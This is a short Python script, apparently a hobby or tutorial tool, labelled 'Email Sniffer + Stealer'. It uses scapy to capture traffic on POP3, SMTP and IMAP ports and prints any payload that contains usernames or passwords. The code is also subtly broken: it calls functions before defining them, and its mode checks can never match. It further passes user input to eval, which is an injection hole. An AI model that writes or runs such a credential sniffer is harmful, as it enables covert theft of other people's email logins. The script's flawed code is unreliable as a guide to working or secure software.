# Email Sniffer
from scapy.all import *

print("~: EMAIL SNIFFER + STEALER :~")

# fire up our sniffer
mode = eval(input("Choose a mode \n[1] Sniff \n[2] Steal \n"))
if mode == "1":
    sniff(prn=simple_callback,count=1)
if(mode == "2"):
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)


# our packet callback
def simple_callback(packet):
    print((packet.show()))

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print(("[*] Server: %s" % packet[IP].dst))
            print(("[*] %s" % packet[TCP].payload))




